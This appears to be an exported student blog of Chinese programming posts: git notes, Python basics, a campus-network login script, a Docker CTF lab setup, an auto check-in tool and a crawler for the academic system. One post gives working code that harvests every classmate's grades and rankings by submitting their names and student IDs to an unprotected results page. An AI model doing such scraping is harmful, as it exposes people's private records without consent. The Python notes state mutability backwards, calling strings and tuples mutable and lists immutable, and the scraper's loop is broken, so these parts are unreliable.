<h3 id="feature分支"><a href="#feature分支" class="headerlink" title="feature分支"></a>feature分支</h3><p>开发一个新feature，最好新建一个分支；</p>
<p>如果要丢弃一个没有被合并过的分支，可以通过git branch -D <name>强行删除。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch -D &lt;name&gt; 强行删除未合并分支</span><br></pre></td></tr></table></figure>

<h3 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h3><h4 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 推送主分支</span><br><span class="line"></span><br><span class="line">git push origin dev 推送dev分支</span><br></pre></td></tr></table></figure>

<h4 id="抓取分支"><a href="#抓取分支" class="headerlink" title="抓取分支"></a>抓取分支</h4><p>查看远程库信息，使用git remote -v；</p>
<p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>
<p>从本地推送分支，使用git push origin branch-name，如果推送失败，先用git pull抓取远程的新提交；</p>
<p>在本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致；</p>
<p>建立本地分支和远程分支的关联，使用git branch –set-upstream branch-name origin/branch-name；</p>
<p>从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b dev origin&#x2F;dev 创建远程origin的dev分支到本地</span><br><span class="line"></span><br><span class="line">git pull 抓取最新提交并合并冲突</span><br><span class="line"></span><br><span class="line">git branch --set-upstream-to&#x3D;origin&#x2F;dev dev 链接本地分支与远程分支</span><br></pre></td></tr></table></figure>

<h3 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h3><p>rebase操作可以把本地未push的分叉提交历史整理成直线；</p>
<p>rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。</p>
<h3 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h3><p>标签是版本库的一个快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag 查看所有标签</span><br><span class="line"></span><br><span class="line">git tag &lt;tagname&gt; &lt;commit id&gt;</span><br><span class="line"></span><br><span class="line">git tag -a &lt;tagname&gt; -m &quot;message&quot; 指定标签信息命令</span><br><span class="line"></span><br><span class="line">git tag -s &lt;tagname&gt; -m &quot;message&quot; PGP签名标签命令</span><br><span class="line"></span><br><span class="line">git show &lt;tagname&gt; 查看标签信息</span><br><span class="line"></span><br><span class="line">git tag -d &lt;tagname&gt; 删除一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin :refs&#x2F;tags&#x2F;&lt;tagname&gt; 删除一个远程标签</span><br><span class="line"></span><br><span class="line">git push origin &lt;tagname&gt; 推送一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin --tags 推送全部未推送过的本地标签</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>python学习笔记</title>
    <url>/posts/743c31e9/</url>
    <content><![CDATA[<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><ul>
<li>number</li>
<li>string</li>
<li>list</li>
<li>tuple</li>
<li>set</li>
<li>dict</li>
</ul>
<p>num string tuple 可变</p>
<p>list dict set 不可变</p>
<h4 id="num"><a href="#num" class="headerlink" title="num"></a>num</h4><p>type() 查看类型</p>
<p>del删除对象</p>
<pre><code>del var
del var_a, var_b
</code></pre>
<p>// 向下取整  /简单除法</p>
<h4 id="string"><a href="#string" class="headerlink" title="string"></a>string</h4><pre><code>str = &#39;helloworld&#39;
str[0:-1] # 第一个到倒数第二个的所有字符
str[0]    # 第一个字符
str[2:5]  # 3到5字符
str[2:]   # 3到最后
str * 2   # 输出2次
str + &#39; &#39; # 连接字符串
</code></pre>
<p>反斜杠可以用来转义，使用r可以让反斜杠不发生转义。</p>
<h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><p>和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。</p>
<p>列表截取</p>
<pre><code>变量[头下标:尾下标]
</code></pre>
<p><img src="https://www.runoob.com/wp-content/uploads/2014/08/list_slicing1_new1.png" alt="img"></p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python实现校园网自动登录</title>
    <url>/posts/cfeeb04a/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配置文件啥的都没有，感兴趣的话自己改改代码就行。</p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>实现了CUMT_Tec和CUMT_Stu的连接，这个我也挺奇怪，tec竟然也能连</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121707.png"></p>
<p>而且竟然能用</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121757.png"></p>
<p>用pyinstaller打包成exe后，设置开机自启动，开机就能自动连了，非常舒服!</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121942.png"></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">TIME = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;Portal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>: <span class="string">f&#x27;dr<span class="subst">&#123;TIME&#125;</span>&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login_method&#x27;</span>: <span class="number">1</span>, <span class="comment"># 运营商编号，我这个是联通</span></span><br><span class="line">    <span class="string">&#x27;user_account&#x27;</span>: <span class="string">&#x27;xxxxxxxx@unicom&#x27;</span>, <span class="comment"># xxxx处为学号</span></span><br><span class="line">    <span class="string">&#x27;user_password&#x27;</span>: <span class="string">&#x27;xxxxxxxx&#x27;</span>, <span class="comment"># xxxxx处为密码</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_ip&#x27;</span>: <span class="string">&#x27;xxxxxx&#x27;</span>, <span class="comment"># ipconfig自己获取</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_mac&#x27;</span>: <span class="string">&#x27;00000000000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_ip&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_name&#x27;</span>: <span class="string">&#x27;NAS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jsVersion&#x27;</span>: <span class="string">&#x27;3.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>: TIME</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q:0.8,zh-TW;q:0.7,zh-HK;q:0.5,en-US;q:0.3,en;q:0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://10.2.5.251/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.2.5.251:801/eportal/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, headers=headers, params=data)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;pause&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后打包，设置开机自启动就行</p>
]]></content>
      <categories>
        <category>python实践</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>vm+kali+docker实现web题复现</title>
    <url>/posts/c52439ad/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上有很多web题的源码，可以直接下载搭建用于赛后复现，但vps搭建比较繁琐，分配域名，分配目录，分配端口且非常不安全，虚拟机本地搭建就比较简单，而且可以直接通过宿主机访问，如果源码有docker compose的话会更加简单，一键即可搭建。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
<li>vm</li>
<li>kali</li>
</ol>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">echo &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list</span><br><span class="line"></span><br><span class="line">apt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-common</span><br><span class="line"></span><br><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>
<p>docker version可查看是否安装成功</p>
<h3 id="下载lamp镜像"><a href="#下载lamp镜像" class="headerlink" title="下载lamp镜像"></a>下载lamp镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search lamp 查找镜像</span><br><span class="line"></span><br><span class="line">docker pull mattrayner&#x2F;lamp 下载镜像</span><br><span class="line"></span><br><span class="line">docker images 查看镜像是否安装成功</span><br></pre></td></tr></table></figure>

<h3 id="搭建题目"><a href="#搭建题目" class="headerlink" title="搭建题目"></a>搭建题目</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 100:80 -p 3307:3306 mattrayner&#x2F;lamp 创建lamp容器，并将docker 80和3306端口分别映射到虚拟机的100和3307端口</span><br><span class="line"></span><br><span class="line">docker ps -a 主要为了获得CONTAINER ID，查看当前运行的容器</span><br><span class="line"></span><br><span class="line">docker cp [题目目录] [CONTAINER ID]:&#x2F;var&#x2F;www&#x2F;html 将题目放到html文件夹</span><br><span class="line"></span><br><span class="line">docker stop [CONTAINER ID] 停止容器</span><br><span class="line"></span><br><span class="line">docker rm [CONTAINER ID] 删除容器</span><br></pre></td></tr></table></figure>

<h3 id="运行题目"><a href="#运行题目" class="headerlink" title="运行题目"></a>运行题目</h3><p>ifconfig获得kali ip，本机测试是否能ping通，在浏览器输入</p>
<pre><code>http://[kali ip]:[映射端口]/[题目目录名]/
e.g. http://192.168.xxx.xxx:100/ezyii/
</code></pre>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>中国矿业大学今日校园自动打卡python实现</title>
    <url>/posts/f7c1df40/</url>
    <content><![CDATA[<blockquote>
<p>寒假就有这个打算了，但在家太懒了，懒得弄，在学校上网课太无聊了，就基于子墨大佬的<a href="https://github.com/ZimoLoveShuang/auto-submit">Github项目</a>改了改，用了一天终于搞完了，弄成了矿大专属的，现在对矿大的学生来说是傻瓜式操作了。</p>
</blockquote>
<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Haorical/CUMT-CampusDaily-auto-submit</span></span><br></pre></td></tr></table></figure>

<h1 id="最终成品"><a href="#最终成品" class="headerlink" title="最终成品"></a>最终成品</h1><p><img src="https://img-blog.csdnimg.cn/20210310174220497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70"></p>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><ol>
<li><p> git克隆代码到本地，有用的是下面3个文件<br><img src="https://img-blog.csdnimg.cn/20210310174431200.png" alt="在这里插入图片描述"><br>其中config.yml是配置文件，也就是需要改的；<br>index.py是运行文件，不用管;<br>requirements.txt是依赖文件;</p>
</li>
<li><p>安装依赖环境，pip命令安装</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li>
<li><p>更改config里面的设置，学号和密码<br><img src="https://img-blog.csdnimg.cn/2021031017573045.png" alt="在这里插入图片描述"></p>
</li>
<li><p>config设置里面一开始的api,由于是我自己的服务器，就不分享了，可以选择自己搭建，<a href="https://blog.zimo.wiki/posts/6c809f81/">点这里</a>，教程挺详细的。还有server酱如果你需要的话，百度就行。</p>
</li>
<li><p>到现在为止就ok了，运行index.py就能实现打卡。但我们需要的是实现自动打卡，实现自动打卡有好多方式：windows计划任务或者腾讯云函数比较常见，当然有服务器的话直接挂服务器上就行。<br><a href="https://jingyan.baidu.com/article/154b463130041128ca8f41c7.html">windows计划任务设置</a></p>
</li>
</ol>
<p><strong>腾讯云函数：</strong><br>1.打开百度搜索腾讯云函数，注册认证后，进入控制台，点击左边的层，然后点新建，名称随意，然后点击上传zip，选择release中的dependency.zip上传，然后选择运行环境python3.6，然后点击确定，耐心等待一下，上传依赖包需要花费的时间比较长<br><img src="https://img-blog.csdnimg.cn/20210310181911184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>2.新建腾讯云函数依赖点左边的函数服务，新建云函数，名称随意，运行环境选择python3.6，创建方式选择空白函数，然后点击下一步 新建腾讯云函数
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20210310182002675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<pre><code>3.提交方法选择在线编辑，把本地修改好的index.py直接全文复制粘贴到云函数的index.py，然后点击文件-&gt;新建，文件名命名为config.yml，然后把本地配置好的config.yml文件中的内容直接全文复制粘贴到云函数的config.yml文件，点击下面的高级设置，设置超时时间为60秒，添加层为刚刚新建的函数依赖层，然后点击完成

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210310182013762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70)
4.配置腾讯云函数
进入新建好的云函数，左边点击触发管理，点击创建触发器，名称随意，触发周期选择自定义，然后配置cron表达式，下面的表达式表示每天中午十二点整执行
</code></pre>
<p>0 0 12 * * * *<br>    5.然后就可以测试云函数了，绿色代表云函数执行成功，红色代表云函数执行失败（失败的原因大部分是由于依赖造成的）。返回结果是success.，代表自动提交成功，如遇到问题，请仔细查看日志<br>    &gt;这是子墨写的，我直接挂在服务器上了，没这么麻烦</p>
<h1 id="遇到的BUG"><a href="#遇到的BUG" class="headerlink" title="遇到的BUG"></a>遇到的BUG</h1><ul>
<li>因为子墨很久没更新了，今日校园升级了接口，直接打开项目，会报错，我直接在index.py里把学校默认成矿大了，就不需要调用了</li>
<li>子墨提供的今日校园模拟登录的api貌似不能用，我根据他另一个项目自己搭建了一个</li>
<li>显示提交错误，这个是因为今日校园des更换密钥了。</li>
<li>去除了一些无关的代码，比如图像上传什么的，不需要</li>
</ul>
<h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
<p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
<blockquote>
<p>邮箱： <a href="mailto:&#105;&#x6b;&#97;&#x65;&#107;&#x6b;&#x6b;&#64;&#100;&#105;&#x6e;&#103;&#116;&#97;&#x6c;&#107;&#x2e;&#x63;&#111;&#109;">&#105;&#x6b;&#97;&#x65;&#107;&#x6b;&#x6b;&#64;&#100;&#105;&#x6e;&#103;&#116;&#97;&#x6c;&#107;&#x2e;&#x63;&#111;&#109;</a></p>
</blockquote>
]]></content>
      <categories>
        <category>哎，我就是玩</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>一次爬虫实战</title>
    <url>/posts/5a85636c/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近迷上了python，各种花里胡哨的库也太好玩了。</p>
<p>今天导员发了个查成绩的通知，外加了链接，一个很简单的网页，输入学号姓名就能查，闲来无事就把所有人的全爬下来了，外加做了一波分析（狗头）</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>很简单的一个网页</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210923231120.png"></p>
<p>先抓包分析，发现post的有用的就真的只有个学号姓名，连个前端加密都没有，直接构造就行。</p>
<p>现学了execel文件读写，用菜的扣脚的beautifulsoup把网页信息提取出来了，很简单。</p>
<p>而且网站连个反爬都没有，直接请求了好几百次都没限制，无语。</p>
<p><strong>代码如下，已去除关键信息，仅供学习！</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlsxwriter <span class="keyword">as</span> xw</span><br><span class="line"></span><br><span class="line">stu = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getScores</span>(<span class="params">name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;187&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">r&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;time&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale0&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale0&#x27;</span>:<span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh0&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale1&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale1&#x27;</span>:<span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh1&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iiii&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tips&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tits&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;button&#x27;</span>:<span class="string">&#x27;立即查询&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        soup = BeautifulSoup(res.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        _count = soup.select(<span class="string">&#x27;td[data-label=&quot;门数&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _scores = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _rank = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分排名&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _major = soup.select(<span class="string">&#x27;td[data-label=&quot;专业&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _class = soup.select(<span class="string">&#x27;td[data-label=&quot;班级&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        tmp = &#123;<span class="string">&#x27;1&#x27;</span>: name, <span class="string">&#x27;2&#x27;</span>: <span class="built_in">id</span>, <span class="string">&#x27;3&#x27;</span>: _count, <span class="string">&#x27;4&#x27;</span>: _scores, <span class="string">&#x27;5&#x27;</span>: _rank, <span class="string">&#x27;6&#x27;</span>: _major, <span class="string">&#x27;7&#x27;</span>: _class&#125;</span><br><span class="line">        stu.append(tmp)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xw_toExcel</span>(<span class="params">data, fileName</span>):</span>  </span><br><span class="line">    workbook = xw.Workbook(fileName)  </span><br><span class="line">    worksheet1 = workbook.add_worksheet(<span class="string">&quot;sheet1&quot;</span>) </span><br><span class="line">    worksheet1.activate()  </span><br><span class="line">    title = [<span class="string">&#x27;姓名&#x27;</span>, <span class="string">&#x27;学号&#x27;</span>, <span class="string">&#x27;门数&#x27;</span>, <span class="string">&#x27;学分加权平均分&#x27;</span>, <span class="string">&#x27;学分加权平均分排名&#x27;</span>, <span class="string">&#x27;专业&#x27;</span>, <span class="string">&#x27;班级&#x27;</span>]</span><br><span class="line">    worksheet1.write_row(<span class="string">&#x27;A1&#x27;</span>, title) </span><br><span class="line">    i = <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        insertData = [data[j][<span class="string">&quot;1&quot;</span>], data[j][<span class="string">&quot;2&quot;</span>], data[j][<span class="string">&quot;3&quot;</span>], data[j][<span class="string">&quot;4&quot;</span>], data[j][<span class="string">&quot;5&quot;</span>], data[j][<span class="string">&quot;6&quot;</span>], data[j][<span class="string">&quot;7&quot;</span>]]</span><br><span class="line">        row = <span class="string">&#x27;A&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        worksheet1.write_row(row, insertData)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    workbook.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">excel_path = <span class="string">&#x27;./stu.xlsx&#x27;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">excel = xlrd.open_workbook(excel_path,encoding_override=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">sheet = excel.sheets()[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">sheet_row_mount = sheet.nrows</span><br><span class="line">sheet_col_mount = sheet.ncols</span><br><span class="line"></span><br><span class="line">name = sheet.col_values(<span class="number">2</span>) </span><br><span class="line"><span class="built_in">id</span> = sheet.col_values(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>():</span><br><span class="line">    getScores(name[i], <span class="built_in">id</span>[i])</span><br><span class="line"></span><br><span class="line">fileName = <span class="string">&#x27;scores.xlsx&#x27;</span></span><br><span class="line">xw_toExcel(stu, fileName)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>python只是用来娱乐，生产力还得是c++!</p>
]]></content>
      <categories>
        <category>python实践</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>中国矿业大学正方教务爬虫</title>
    <url>/posts/6f73e94e/</url>
    <content><![CDATA[<h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p>
<p><a href="https://github.com/Haorical/CUMT-jwxt">https://github.com/Haorical/CUMT-jwxt</a></p>
<p>配置好后直接运行main.py就可以体验爬取成绩的功能，代码可读性良好，适合二次开发。</p>
<p>本着服务抗大学子的宗旨，写了这个教务爬虫，用来练手，应该会开发一段时间，目前只<br>实现了模拟登录和爬取成绩，万众瞩目的自动抢课功能由于当前没有开放选课，暂时无法<br>开发，暂时搁置。</p>
<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一共写了两个版本，一个是使用selenium的SlowLogin，看名字就看出来了，这个登录的慢<br>而且需要配置webdriver，登录一次大约需要8-10秒钟；另一个是基于requests的<br>FastLogin，这个顾名思义就相当的快了，登录一次不到五秒钟，速度飞起，而且可能我用的<br>vpn比较卡，在校园网上应该能更快。</p>
<p>两个版本可以自由切换,在config中设置即可，更改login即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - login: <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>

<p>两个模拟登录都可以直接返回成功登录之后的cookie，可以用来爬之后的界面，非常适合二次开发，欢迎二次开发，最好给个star :)</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>先说SlowLogin，比较无脑，获得输入框的xpath，然后直接sendkeys，这里有个比较麻烦<br>的就是验证码的问题，这里我用了webdriver的screenshot方法，将图片保存到本地，然后调用<br>百度的ocr，要花钱(5555)，而且存在识别错现象。因为本来就不是很智能，用人眼看填验证码的话<br>就更不智能了。</p>
<p>FastLogin这个就非常智能，模拟了发包过程，通过分析登录操作可以知道，先get RSA的公钥再get验证码，分析前端加密js可知，是通过rsa对password进行了加密，我们可以用简单的用python模拟，考虑到搭建环境太复杂，这里是模拟的，没有用exejs和node.js，因此耗费了很长时间，其中jsFunction模拟了js中对RSA的加密。由于get的验证码是二进制文件<br>我们可以直接将其写入文件中，然后调用baiduocr的api识别，或者人工识别，两个函数在FastLogin中可以自由选择，可以通过config.yml进行设置</p>
